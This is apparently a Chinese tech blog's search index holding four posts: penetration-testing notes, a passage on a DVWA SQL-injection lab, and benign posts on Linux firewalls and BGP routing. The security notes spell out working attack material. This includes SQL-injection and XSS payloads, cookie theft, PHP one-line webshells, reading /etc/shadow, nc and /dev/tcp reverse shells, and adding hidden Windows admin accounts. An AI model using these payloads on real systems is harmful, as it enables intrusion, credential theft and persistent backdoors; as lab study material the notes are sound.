<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[网络安全笔记]]></title>
      <url>/%E5%AE%89%E5%85%A8/2019/01/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="text"><![CDATA[1 网络攻防基本介绍1.1 渗透测试分类1.1.1 黑盒测试黑盒测试也称为功能测试，它是通过测试来监测每个功能是否都能够正常使用，在测试中，将程序看作一个不能够打开的盒子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试，它只检查程序是否按照需求规格说明的规定正常使用，程序是否能够适当的接受输入数据而产生正确的数输出信息。黑盒测试着眼于程序外部结构，不考虑内部结构，主要针对软件界面和软件功能进行测试。1.1.2 白盒测试白盒测试称为结构测试或逻辑驱动测试，是一种测试用例使用方法，它从程序的控制结构导出测试用例。1.1.3 灰盒测试灰盒测试是介于黑盒测试和白盒测试中间的一种测试，测试多用于集成测试阶段，不仅关注输入与输出的正确性，同时也关注程序的内部情况。2 渗透测试2.1 术语扫描 木马、病毒 黑帽子、白帽子 社会工程学 钓鱼poc、exploitWebShellDDoSARP攻击0day2.2 常见攻击web:xss,csrf,提权逻辑错误DB:sql注入,漏洞利用系统层:DDOS,远程溢出(MS08-067,MS10-020),rootkit,0day网络层:DDOS,ARP欺骗2.3 流程信息收集-&gt;扫描探测-&gt;漏洞利用-&gt;通道控制-&gt;内网扩展-&gt;资料回传2.4 HTTP协议抓包工具Burp Suite3 Burp Suite使用3.1 Target3.2 Proxy代理，正对目标主机进行数据转发及数据包抓取。3.3 Spider爬虫，爬取网站信息。3.4 Scaner漏洞扫描，查看网站中常见的可利用漏洞。3.5 Intruder暴力破解流程:1.打开数据包数据代理,在浏览器中打开网站登录界面,在Target中获取登录页面,发送至暴力模块.2.在暴力模块中positions中清除所有标记,然后选择自己感兴趣的变量.3.然后在暴力模块中选择payloads中选择所标记的变量及匹配方式.4.导入准备好的字典文件,然后点击Start attack按钮进行暴力破解.4 HTTP协议4.1 http协议请求类型GET：请求指定页面内信息，返回实体主体POST：请求服务器所接受指定的文档作为对所标识的URl的新的从属实体PUT：从客户端向服务器传送的数据取代指定的文档的内容DELETE：请求服务器删除指定的内容HEAD：只请求页面的首部OPTIONS：允许客户端查看服务器的性能4.2 http状态码1xx-提供信息2xx-请求被成功提交3xx-客户端被重定向到其它资源4xx-请求错误5xx-服务器错误5 DVWA暴力破解5.1 暴力破解定义5.1.1 常见分类1.本地程序类 本地游戏等(IDA、Uedit32、ollydbg反汇编)2.远程服务类 OA系统等(利用密码字典,穷举法猜出用户口令)3.MD5等加密串暴力破解5.1.2 暴力破解DVWA在使用burp suite时可以根据http状态码,长度及返回信息中的关键字信息来确认是否暴力破解成功,然后使用匹配成功的帐号去登录系统.5.1.3 万能密码5.1.4 sql注入破解密码6 SQL注入6.1 mysql修改密码mysqladmin -u root -p password "123456"; //在操作系统中update user set password=password("123456") where user='root'; //在数据库中update user set authentication_string=password("123456") where user='root'; //在5.7及以上的版中使用如果忘记密码时，则可以跳过权限检查，然后在执行上面mysql中的命令service mysql stopmysql_safe --skip-grant-table &amp;执行修改后，重启服务即可6.2 sql注入类型按照提交方式 get post cookice按照数据库类型：php+mysql asp+access jsp+oraclesql注入分为显注和盲注联合注入 //报错注入 //http://192.168.1.117/index2.php?name=admin'and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) and '整型参数，字符，字符须注意单引号闭合6.3 注入方式手动注入利用sqlmap工具6.4 sqlmap常用命令sqlmap -u url --dbs //爆数据库sqlmap -u url --current-user //爆当前用户sqlmap -u url --user //查看用户权限sqlmap -u url --tables -D 数据库 //爆表段sqlmap -u url --columns -T 表段 -D 数据库 //爆字段sqlmap -u url --dump -C 字段 -T 表段 -D 数据库 //猜解6.5 手动注入以DVWA为例order by: 表序列union select: 联合查询猜测当前数据库中表的个数：1' order by 3 # //当数目超过表个数之后数据库会返回错误信息1' union select 1,version() # //查询数据库版本1' union select 1,database() # //查询数据库名称1' union select 1,user()# //查询用户1' union select 1,password from users # //查询数据库中所有用户密码1' union select user,password from users # //查询数据库中所有用户及密码，如下图6.6 SQLserver开启xpcmdshell功能首先，需要上传简单木马，可以通过菜刀连接到服务器，获取网站的配置文件中关于数据库帐号信息，然后配置菜刀中数据库的相关参数，再执行如下命令之后就可以开启服务器中的shell功能，我们可以尝试执行一些系统的命令。EXEC sp_configure 'show advanced options',1 RECONFIGURE  //打开数据库高级功能EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE //打开xp_cmdshell功能exec master..xp_cmdshell "whoami" //执行命令6.7 mysql数据库结构information_schemamysql 用户 权限等运行所需信息 mysql.userload_fileload_datasecure_file_priv 5开始需设定这个值并且有高权限，file权限，读写绝对路径文件。select [content] into file/dumpfile [path] //file会做特殊字符转移，dumpfile不会做转移7 文件包含7.1 php中常用四个文件包含函数include()include_once()require()require_once()包含类型分为本地包含和远程包含本地包含：http://192.168.1.103/www/vulnerabilities/fi/?page=02.php远程包含：http://192.168.1.103/www/vulnerabilities/fi/?page=http://192.168.1.103/php.ini7.2 php伪协议php://filter //例如：http://45.76.206.86:10000/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=file1.phpphp://inputZip://Phar://Rar://8 XSS漏洞攻击8.1 xss反射型手动测试&lt;script&gt;alert(1)&lt;/script&gt; //反弹信息"&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;"onclick="alert(/xss/)&lt;/script&gt;8.2 同源策略同协议 http https同域名同协议X-Frame-Option DENY //不允许嵌入iframe标签8.3 xss存储型攻击存储在数据库中，当页面每次加载数据库中的信息时，将之前插入数据库中的javascript语句进行执行并展示给用户。首先找一个有xss漏洞的网站，在XSS平台上注册一个帐号，生成一个攻击模板，然后使用这个模板的短网址复制到输入框中，将这个连接提交存储到数据库中，成功之后，用户每次访问数据库中的这条数据时，就会将用户的cookie信息上传到服务器中，这样我们使用上传的地址及cookie信息登录到系统中。Figure 2: 在xss平台生成模板得到短地址Figure 3: 查看获取的信息Figure 4: 使用老兵进行系统登录当自己有服务器时，我们可以在自己的服务器上放一个攻击脚本及信息收集脚本，然后，在其它有xss漏洞的网站上上传我们的服务器脚本连接至数据库中，这样当正常用户访问页面时，加载我们的连接脚本后，可以将用户的cookie及浏览url等信息上传至我们的服务器中，我们可以根据此信息，在浏览器中使用插件，将自身的cookie修改问其他正常用户的cookie信息，这样我们就可以达到，使用他人信息登录网站的目地。8.4 DOM型xss攻击\\x3Cscript\\x3Ealert(document.domain)\\x3CScript\\x3E\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e8.5 php防御htmlentities($input) //输出原有字符，不出现弹窗&lt;?php$input=$_GET['input'];echo $input; //直接输入alert即可&lt;?php$input=$_GET['input'];echo htmlentities($input); //无法注入&lt;?php$input=$_GET['input'];echo '&lt; img src='.htmlentities($input).'&gt;';  //input=123 onclick=alert(123)&lt;?php$input=$_GET['input'];$input=str_replace('=','',$input);echo '&lt; img src='.$input.'&gt;'; //?input=w&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;?php$input=$_GET['input'];//$input=str_replace(' ','',$input);$input=str_replace('=','',$input);echo '&lt; img src='.htmlentities($input).'&gt;'; //无法注入DOM型XSS&lt;?php$input=$_GET['input'];$input=str_replace('=','',$input);echo '&lt;script&gt;var a="'.htmlentities($input).'";document.write(a);&lt;/script&gt;';//?input=\x3Cscript\x3Ealert(1234565)\x3C/script\x3E可以绕过防御9 文件上传漏洞攻击9.1 文件上传JS验证1、在点击上传文件之前，首先F12打开源代码文件，将上传按钮中关于上传文件格式检查的函数取消，这样可以绕过文件类检查，将目标文件上传至网站中。Figure 5: 取消文件名称检查2、将可利用的代码写至图片文件中，依然使用图片文件后缀名文件进行上传文件，在点击上传的同时开启burp suite进行数据抓包操作，将抓到的数据包中将文件名的后缀改成php等服务器可以识别的文件名，这样就可以使用菜刀等软件实现攻击网站的目地。Figure 6: 使用ubrp suite进行文件名称修改3、将可利用代码写至图片中的方法cat caidao.php &gt;&gt; caidao.jpg //Windowscopy /b caidao.php+caidao.jpg caidao.jpg //Linux9.2 文件上传MIME验证修改数据包中Content-Type的值，修改为网站允许的类型后就可以上传文件，对应php中$file[]的值。Figure 7: 修改Content-Type值9.3 服务端扩展名验证1、将后缀名进行大小写更改进行尝试2、将后缀名添加其它字符进行上传尝试，如:file.php13、白名单无法绕过，Php phtml php3 php5 php74、黑名单，php phtml php5 (.user.ini .htaccess配置文件，改变服务器对文件解析方式，任意文件包含，更改后实时生效）autoappendfile包含在文件头部，autoprependfile包含在文件结尾5、将文件后缀名称之后添加"点空格[. ]"这样可以绕使用windows文件系统特性绕过安全检查9.4 文件内容更改在文件名称及文件类型正常的情况下，我们可以更改文件中的内容从而绕过服务器对上传文件的验证。将脚本文件中内容追加到图片中，服务器在验证图片信息时仅仅查看文件的头部信息，对其后面的数据信息并不进行判断，应此我们可以使用此方法将可执行代码上传至服务器。 Figure 8: 更改文件中内容10 CSRF攻击根据用户修改页面的源码生成一个csrf脚本，当用户点击这个新生成的脚本时，就可以在数据库中更改密码。Figure 9: csrf攻击脚本11 SSRF11.1 phpurl_init()http:://[address]file://[127.0.0.1]/etc/passwdgopher://   --redis 未授权访问dict://127.0.0.1:22  探测端口号parse_url:使用file绕过parse_url12 攻防一、防护1、修改已知帐号密码，数据库，windows管理员密码2、尽快发现自己的一些漏洞、木马、备份文件，系统安装文件、危险端口如4453、实时关注常用服务日志二、攻击1、扫描端口、寻找敏感端口，nmap、御剑20142、扫描网站目录，使用御剑3、爆破常用服务(21,22,3389.3306,1433)13 php相关13.1 回调函数call_user_function('system','ls')system exec shell_exec passthru popen pcntl_exec13.2 php脚本函数执行&lt;?php  $a='a';$b='b';$c="$a+${$b}";$e=phpinfo();$h=system('cat /etc/shadow');$f="${${system('ls /tmp')}}"$d="${${phpinfo()}}";echo $c;?&gt;13.3 一句话木马assert($_GET[pass]); //?pass=system('ls')$_GET[a](S_GET[b]); //?a=assert&amp;b=phpinfo() ?a=system&amp;b=ls$s=$_GET['a']; eval("\a = \"$a\";");call_user_function($_GET[a],$_GET[b]); 回调函数14 JAVA14.1 备份备份源码、数据库14.2 修改口令系统密码14.3 扫描服务netstat -ano ps -aux nmap -p- x.x.x.x14.4 加固web:cms 后台管理修改路径,更改为一个不可攻击的页面14.5 struts205705215 Docker使用15.1 docker基本命令docker pull ubuntu 下载镜像docker run --name host_name -itd -p 0.0.0.0:80:80 -v /var/www/thml:/root ubuntu bash 创建容器docker ps 查看运行中的容器docker ps -a 查看所有容器docker start/stop/restart [container] 启动/停止/重启docker rm -f 删除容器(-f运行中容器)docker rmi 删除镜像docker save -o test.tar test 打包镜像docker load &lt; test.tar 导入镜像15.2 docker给运行中的容器添加映射端口1、将容器的8000端口映射到dokcer主机的8001端口docker inspect webapp | grep IPAddressiptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination x.x.x.x:80002、方法2docker commit containerid foo/live 提交一个运行中的容器为镜像docker run -d -p 8000:80 foo/live /bin/bash 运行镜像并添加端口15.3 Docker remote apidocker remote api是一个取代远程命令行界面的Rest api。启动docker remote api方式如下:dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678执行开机启动#vi /etc/sysconfig/dockerother_args = " -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678"#service docker restartdocker验证配置#docker -H localhost:5678 version15.4 Dcosdcos自动部署docker软件。16 Mysql使用16.1 mysql常用命令show databases; 查看数据库show tables; 查看数据库中表use database_name; 选择数据库select user(); 查看当前用户信息select database(); 查看当前数据库select schema(); 查看当前数据库select user,host,password from mysql.user; 查询信息update user set password=password('12') where user='jsf'; 更改密码flush privileges; 刷新-更改系统配置之后desc table_name;查看表结构select 查询update 更新insert into 插入数据delete 删除某条数据drop 删除表 删除数据库create 新建表 新建数据库alter 更改表grant 设置用户权限或新建用户 （需要更新权限 flush privileges）create database test; 穿件数据库grant all privileges on weixin.* to jsf1@'%' identified by '123456'; 创建用户及授权grant select on dvwa.* to 'test'@'localhost' identified by 'test'; 分配dvwa数据库查询权限给test用户show variables; 查看系统变量16.2 sql注入1、空格绕过%0a %0b %a0 %09()`+select+user+from`information_schema`.`schmata`where mysql特殊字符后面可以跟关键字2、php过滤单引号双引号$id=mysql_real_escape_string($id)在sql语句中必须对变量使用引号，否则此过滤失效。17 在信息安全中常用工具17.1 wireshark使用1、wireshark数据包及关键字查询http.request.method==POST &amp;&amp; http contains sgctfhttp.request.method==POST &amp;&amp; http contains ctfhttp.request.method==POST &amp;&amp; http contains flaghttp.request.method==GET &amp;&amp; http contains sgctfhttp.request.method==GET &amp;&amp; http contains ctfhttp.request.method==GET &amp;&amp; http contains flag17.2 查看文件的md5值1、linux系统下md5sum file_name2、windows系统下certutil -hashfile filename MD5certutil -hashfile filename SHA1certutil -hashfile filename SHA25617.3 http流量在http流量收集及攻击中我们会用到很多有用的工具如：Burp Suite、arpspoof、driftnet、sslstrip等。arpspoof:可以用来在局域网中进行arp攻击driftnet:获取数据包中的图片，同时也支持抓取音频文件17.3.1 http PUT方法采用put方法可以上传非法文件及修改文件名称。补丁更新服务关闭(webDAV)17.4 操作系统1、在操作系统方面常用的工具有:nmap、tcpdump、wireshark、zmap、ettercap、metasploit等。nmap使用(Winpcap)：nmap -sn ip 开机状态nmap -sP ip 通过Ping测试nmap -Pn ip 监测全部端口nmap -P0 ip 直接进行扫描nmap -sN ip 执行tcp空扫描欺骗防火墙nmap -p ip 指定端口，多个之间使用逗号隔开nmap -O ip 识别远程操作系统2、命令行注入利用到的字符串"&amp;" and "&amp;&amp;"may be "|" or "||"17.5 数据库数据库安全性测试过程中常用工具有sqlmap等17.6 文件分析软件对于非文本文件(jpg)的查看不能使用常用的文本编辑器，而是需要特殊的软件去分析文件中所隐含的信息，如使用hexdump、od我们可以查看到一些有用的信息。18 常用中间件管理地址及默认帐号及漏洞利用以下服务中可以通过默认帐号或者直接上传，我们已经制作好的后门war文件。18.1 windows常用命令net user add likaikai 123456 /add //添加用户net localgroup administrators likaikai /add  //添加到管理员组query user //查询在线用户logoff id //剔除在线用户，可以登录远程桌面REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f //CMD开启查看3389端口 免重启 开启3389start \\192.168.1.136\c$\Windows\ //当攻防时，为防止对方发现自己使用远程登录系统，则可以使用这个命令来访问对方文件18.2 Weblogicurl: http://localhost:7001/consoleusername: weblogicpassword: weblogic12318.3 Tomcattomcat path:/usr/local/tomcaturl: http://localhost:8080username: adminpassword: 123在极端情况下可以删除manager目录，从而web管理界面无法打开，需要重启服务CVE-2017-12615 tomcat 8.5.19 put 漏洞，由conf/web.xml-&gt;readonly引起，设置为True即可解决问题burp中put文件，PUT /jsf.jsp/ HTTP/1.1然后写上文件内容即可。18.4 Jboosurl: http://localhost:808018.5 IIS漏洞使用在上传文件中，在文件名称中添加asp/file.jpg后，就可以以php的方式去运行这个jpg文件，这样我们就可以上传后门代码值服务器。19 日志分析查看分析常见操作系统及中间件日志文件，apache日志、IP、时间、请求资源及方式、http状态码，tomcat等软件。20 工具使用实验20.1 nc软件使用1、Windows nc反弹cmdshellnc -lvp 8080 //本地执行nc -e cmd.exe dest_ip 8080 //服务器执行2、Linux nc反弹shellnc -lvp 8080 //本地执行/bin/bash -i &gt;&amp; /dev/tcp/dest_ip 8080 0&gt;&amp;1 //服务器执行20.2 通过mysql服务向web目录读写文件通过暴力破解获取远程mysql服务器登录权限，在数据库权限足够高的情况下可以读写网站的相关文件。select 'test string' into outfile 'C:\www\jsf.php';select load_file('C:\www\jsf.php');20.3 IIS put漏洞使用我们可以使用工具去扫描网站是否支持http put方法，如果检测发现能够使用put方法，我们就可以针对服务器进行进一步的攻击，我们可以上传恶意文件，然后可以进行修改文件信息等的操作。首先如图，我们针对目标服务器进行扫描。Figure 10: 进行服务器put扫描扫描到可以使用的put服务器之后，我们进一步针对某个页面查看，这个页面支持那些http方法，如图Figure 11: 查看页面option然后，在本地准备一个名称jsfput.txt的文本文件，其中文件的内容为：Figure 12: 服务器上传脚本文件内容接着在工具中我们选择使用put方法，将本地制作好的文件上传到服务器中，如图Figure 13: put文件至服务器再使用move方法，将我们已经上传至服务器中的文件进行文件名称更改Figure 14: 脚本文件名称修改名称修改成功之后，我们可以在菜刀软件中可以添加服务器中的脚本文件路径，并且在密码输入框中输入我们在脚本文件中定义好的密码字符，在下面选择相应的服务器执行语言后，点击添加，最后我们右键新输入的条目，就可以选择相应的功能。如文件浏览，虚拟终端等。Figure 15: 将已攻击的网站信息添加到菜刀软件中Figure 16: 浏览网站文件20.4 Metasploit 渗透Windos7使用metasploit可以方便的进行渗透实验，我们可以在kaililinux操作系统中使用已经安装好的工具metasploit来对某些主机进行渗透实验，在本实验中我们选择一台主机作为被攻击对象，首先使用工具nmap来查看目标主机开发了那些服务，然后我们就可以针对开启的服务进行选择性的攻击。Figure 17: 扫描端口我们可以从中发现在目标主机中开启了445端口，然后我们可以针对这个漏洞做一些操作，按照下面的步骤我们就可以进入远程主机。Figure 18: 设置Figure 19: 设置远程主机Figure 20: 开始进行渗透经过上面的操作我们可以看到kalilinux已经和目标主机之间建立了通行，接下来我们就可以查看目标主机的信息并且获取目标主机shell权限来执行一些脚本。Figure 21: 查看系统信息Figure 22: 执行脚本20.5 .cgi为文件后缀名漏洞使用如果发现网站上有.cgi为后缀名称的文件时，我们可以尝试使用反弹shell利用，在本机执行如下两条命令之后，我们就有可能获取到服务器的shell权限。Figure 23: 打开本地监听端口Figure 24: 漏洞利用远程主机连接至本地监听20.6 jboss java反序列化工具使用当我们发现在服务器上使用了jboss软件服务时，我们就可以尝试使用这个工具去尝试对网站进行一些信息的收集、命令执行及webshell上传等操作。]]></content>
      <categories>
        
          <category> 安全 </category>
        
      </categories>
      <tags>
        
          <tag> Shell </tag>
        
          <tag> Dos </tag>
        
          <tag> PHP </tag>
        
          <tag> Mysql </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Linux防火墙]]></title>
      <url>/linux/2019/01/07/linux%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      <content type="text"><![CDATA[1 Linux防火墙防火墙依据策略可以对经过防火墙的流量进行过滤。防火墙的策略可以基于源目的地址、端口号、协议、应用信息等来制定策略，通过匹配预先制定的规则对流量进行相应的处理。在早期的linux系统中使用iptables来作为定义防火墙策略的管理工具，而在新的系统中加入了firewalld。它们并不是真正的防火墙，iptables服务会将预先配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而firewalld服务会将配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。1.1 iptablesiptables是早期linux中默认使用的防火墙配置管理服务，目前依然后很多系统中仍然使用iptables。1.1.1 规则规则是系统管理员定义的条件，规则分别指定了源目标地址、传输协议(tcp,udp,icmp)及服务类型(http,ftp,ssh)等，当数据包与规则相匹配时，就根据所定义的方法来处理这些数据包，如accept、reject、drop。1.1.2 链多条规则可以形成一个链。五链：INPUT链：进来的数据包应用此规则链中的策略OUTPUT链：出去的数据包应用此规则链中的策略FORWARD链：转发数据包应用此规则链中的策略PREROUTING链：在对数据包做路由选择之前应用此规则链中的策略POSTROUTING链：在对数据包做路由选择之后应用此规则链中的策略1.1.3 表表提供了特定的功能，用于实现包过滤、网络地址转换及包重构功能，表中的规则写在链上面。四表：filter表：数据包过滤Nat表：网络地址转换（IP、port）Mangle表：修改数据包的服务类型、ttl，可以配置路由实现qosRaw表：决定数据包是否被状态跟踪机制处理1.1.4 iptables常用参数及作用参数作用-F清空规则链-L查看规则链-A在规则链的末尾加入新规则-I num在规则链的头部加入新规则-D num删除某一条规则-s匹配来源地址IP/MASK，加叹号“!”表示除这个IP外-d匹配目标地址-i 网卡名称匹配从这块网卡流入的数据-o 网卡名称匹配从这块网卡流出的数据-p匹配协议，如TCP、UDP、ICMP&#x2013;dport num匹配目标端口号&#x2013;sport num匹配来源端口号1.1.5 iptables命令示例：1、清空防火墙规则链及查看iptables -Fiptables -L2、设置转发规则链默认策略为拒绝iptables -P FORWARD DROP3、INPUT链中添加ICMP流量进入的策略规则iptables -A INPUT -p icmp -j ACCEPT4、INPUT链中添加允许指定网段主机访问本机ssh服务，并拒绝其它主机访问ssh服务iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPTiptables -I INPUT -p tcp --dport 22 -j REJECT5、删除INPUT链中的某条规则iptables -D INPUT 11.2 firewalldfirewalld支持动态更新并加入了区域概念。1.2.1 firewalld常用区域名及策略规则区域默认规则策略trusted允许所有数据包home拒绝流入的流量，如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量internal等同于home区域work拒绝流入的流量如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量public拒绝流入的流量，而如果流量与ssh、dhcpv6-client服务相关，则允许流量external拒绝流入的流量，而如果流量与ssh服务相关，则允许流量dmz拒绝流入的流量，而如果流量与ssh服务相关，则允许流量block拒绝流入的流量drop拒绝流入的流量1.2.2 firewalld-cmd命令常用参数及作用参数作用&#x2013;get-default-zone查询默认的区域名称&#x2013;set-default-zone=&lt;区域名称&gt;设置默认的区域，使其永久生效&#x2013;get-zones显示可用的区域&#x2013;get-services显示预先定义的服务&#x2013;get-active-zones显示当前正在使用的区域与网卡名称&#x2013;add-source=将源自此IP或子网的流量导向指定的区域&#x2013;remove-source=不再将源自此IP或子网的流量导向某个指定区域&#x2013;add-interface=&lt;网卡名称&gt;将源自该网卡的所有流量都导向某个指定区域&#x2013;change-interface=&lt;网卡名称&gt;将某个网卡与区域进行关联&#x2013;list-all显示当前区域的网卡配置参数、资源、端口以及服务等信息&#x2013;list-all-zones显示所有区域的网卡配置参数、资源、端口以及服务等信息&#x2013;add-service=&lt;服务名&gt;设置默认区域允许该服务的流量&#x2013;add-port=&lt;端口号/协议&gt;设置默认区域允许该端口的流量&#x2013;remove-service=&lt;服务名&gt;设置默认区域不再允许该服务的流量&#x2013;remove-port=&lt;端口号/协议&gt;设置默认区域不再允许该端口的流量&#x2013;reload让“永久生效”的配置规则立即生效，并覆盖当前的配置规则&#x2013;panic-on开启应急状况模式&#x2013;panic-off关闭应急状况模式1.2.3 firewalld-cmd命令示例1、查看运行状态firewall-cmd --state2、查看已激活的Zone信息firewall-cmd --get-active-zones3、查看指定接口的zone信息firewall-cmd --get-zone-of-interface=eth04、查看指定级别的接口firewall-cmd --zone=public --list-interfaces5、查看指定级别的所有信息firewall-cmd --zone=public --list-all6、查看所有级别中被允许的服务friewall-cmd --get-service7、添加smtp服务至work zonefirewall-cmd --zone=work --add-service=smtp8、从work zone中移除smtp服务firewall-cmd --zone=work --remove-service=smtp9、允许tcp端口8000至dmz级别firewall-cmd --zone=dmz --add-port=8000/tcpfirewall-cmd --reload10、允许范围内udp端口至public级别，设置永久生效firewall-cmd --zone=public --add-port=8000-9000/udp --permanent11、设置public为默认的信任级别firewall-cmd --set-default-zone=public]]></content>
      <categories>
        
          <category> Linux </category>
        
      </categories>
      <tags>
        
          <tag> shell </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[BGP选路原则]]></title>
      <url>/network/2018/12/30/bgp%E9%80%89%E8%B7%AF%E5%8E%9F%E5%88%99/</url>
      <content type="text"><![CDATA[1 BGP选路原则1.1 优选具有最大Weight值的路由1、cisco私有，越大越优先；2、本路由器有效，不会传递给任何BGP邻居；3、范围为0～65536；4、从其它邻居学习过来的路由，在本地weight默认为0；5、本地network产生的路由weight为32768；6、本地重分发的直连接口路由、静态路由weight值为32768；7、本地汇总产生的BGP的路由weight值为32768。1.2 选择具有最大Local-Preference的路由1、Local-Preference值越大，越优先；2、默认本地始发的路由的Local-Preference为100，从EBGP peer接受的路由（本地赋值）的Local-preference为100；3、Local-Preference属性仅在IBGP peer之间传递，不能在EBGP peer之间传递；1.3 优选起源于本地的路由起源于本地的路由，如本地network、aggregate、redistribute即下一跳地址为0.0.0.0的路由，在BGP路由表中本路由器通告的下一跳为0.0.0.0。该比较原则主要指本地一条IGP路由进入BGP路由表时，使用不同的方式如network或redistribute时，这些方式之间存在优先级: network&gt;redistribute&gt;aggregate，该原则并不会作为BGP的选路策略。1.4 优先as-path最短路由1、选择长度最小的as-path路由；2、其它as-apth比较: (1)、在做聚合路由时，使用as-set产生的as-apth列表的{}中的as号长度只算一个as号的长度。(2)、在联盟内的as-path列表()中的as号长度不做计算依据；3、当向EBGP peer邻居通告路由时，将自己的as号加在as-path列表的最左端，向IBGP peer通告路由时，不会对as-path列表做修改；4、针对EBGP peer可以修改as-path列表；5、可以配置跳过as-path长度的比较；6、修改as-path长度可以作为BGP选路的一种策略。1.5 OriginOrigin属性的优先顺序为：IGP &gt; EGP &gt; incomplete1.6 MED1、优选MED最小的路由，值越小越优先；2、默认只比较来自同一邻居的as的BGP路由的MED值；3、MED在as之间交换，MED发送非EBGP对等体，这些路由器在as内传播MED，不能传递给下一个as；4、使用network或redistibute将IGP路由引入BGP时，MED将继承IGP路由的Metric（直连路由Metric=0）；5、使用aggregate-address方式引入路由，MED值为空；1.7 优选EBGP邻居更新的路由优选EBGP邻居发来的路由（相对于IBGP邻居学习的路由），在联邦EBGP和IBGP中优选联邦EBGP路由。当使用前六条原则仍然无法决定路由的优先顺序时，会根据EBGP路由优先于IBGP路由的原则进行优选，该原则不会作为BGP选路原则。1.8 优选BGP next-hop最近的邻居比较到达BGP路由路径属性中的next-hop地址的IGP Metric值，越小越优先，该值与MED没有任何关系，几乎很少使用该原则作为BGP选路原则。1.9 等价负载均衡如果有多条来自相同相邻as的路由并通过maximum-apths使多条路径可用，则将所有开销相同的路由放入本地路由表中。前面的8条选路路径都无法选出最优路由时，并且在BGP中配置了maximum-paths时，将进行等价负载均衡。(1)、必须具有相同的路径属性，如weight、LP、as-apth（长度及as号都要相同）(2)、如果不关联ibgp关键字，那么只会对EBGP路由做等价负载均衡1.10 优选最老的EBGP路由根据EBGP路由接收顺序，主要针对EBGP路由，优先使用最老的路由，在IBGP环境中，这条规则并不适用。1.11 BGP邻居RID越小越优先1、router-id越小，越优先；2、上面几条选路原则已经完成了EBGP路由的优先选择，应此后三条都时针对于IBGP路由。1.12 优选cluster—list最短的路由1、长度越小，越优先；2、仅存在反射器的情况下，才会进行cluster-list长度的比较，RR在执行路由反射动作时会将自己的cluster id 添加值cluster-list中。1.13 选择邻居IP地址最小的路由1、邻居的ip地址越小，越优先。]]></content>
      <categories>
        
          <category> Network </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[基础SQL注入]]></title>
      <url>/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/</url>
      <content type="text"><![CDATA[1 手工sql注入sql注入，就是用户通过浏览器提交的变量内容，后台应用程序对浏览器提交的内容并未进行检查过滤，直接拼接sql语句后去查询数据库，导致将数据库中的其它信息返回至用户界面中，造成数据库中其它未对用户授权的数据泄漏。1.1 DVWA Sql注入学习测试sql语句"SELECT first_name, last_name FROM users WHERE user_id = '$id';"1.1.1 返回内容正常ID: 1First name: adminSurname: admin1.1.2 返回查询所有记录ID: 1' or '1'='1First name: adminSurname: adminID: 1' or '1'='1First name: GordonSurname: BrownID: 1' or '1'='1First name: HackSurname: MeID: 1' or '1'='1First name: PabloSurname: PicassoID: 1' or '1'='1First name: BobSurname: Smith1.1.3 判断有多少个字段，修改order by 后面的字段值，直到数据库报错ID: 1' or 1=1 order by 2 #First name: adminSurname: adminID: 1' or 1=1 order by 2 #First name: GordonSurname: BrownID: 1' or 1=1 order by 2 #First name: HackSurname: MeID: 1' or 1=1 order by 2 #First name: PabloSurname: PicassoID: 1' or 1=1 order by 2 #First name: BobSurname: Smith执行结果说明，sql查询语句中只有两个字段1.1.4 确定显示的字段顺序ID: 1' union select 1,2 #First name: adminSurname: adminID: 1' union select 1,2 #First name: 1Surname: 21.1.5 获取当前数据库及版本ID: 1' union select version(),database() #First name: adminSurname: adminID: 1' union select version(),database() #First name: 10.1.26-MariaDB-0+deb9u1Surname: dvwa从返回结果中我们可以看出数据库的名称和版本号1.1.6 获取数据库中的表ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #First name: adminSurname: adminID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #First name: 1Surname: guestbook,users返回结果说明，数据库中存在了两张表为: guestbook,user1.1.7 获取表字段名称ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #First name: adminSurname: adminID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #First name: 1Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login1.1.8 获取表中数据ID: 1' union select group_concat(first_name),group_concat(password) from users #First name: adminSurname: adminID: 1' union select group_concat(first_name),group_concat(password) from users #First name: admin,Gordon,Hack,Pablo,BobSurname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99ID: 1' union select last_name,password from users #First name: adminSurname: adminID: 1' union select last_name,password from users #First name: adminSurname: 5f4dcc3b5aa765d61d8327deb882cf99ID: 1' union select last_name,password from users #First name: BrownSurname: e99a18c428cb38d5f260853678922e03ID: 1' union select last_name,password from users #First name: MeSurname: 8d3533d75ae2c3966d7e0d4fcc69216bID: 1' union select last_name,password from users #First name: PicassoSurname: 0d107d09f5bbe40cade3de5c71e9e9b7ID: 1' union select last_name,password from users #First name: 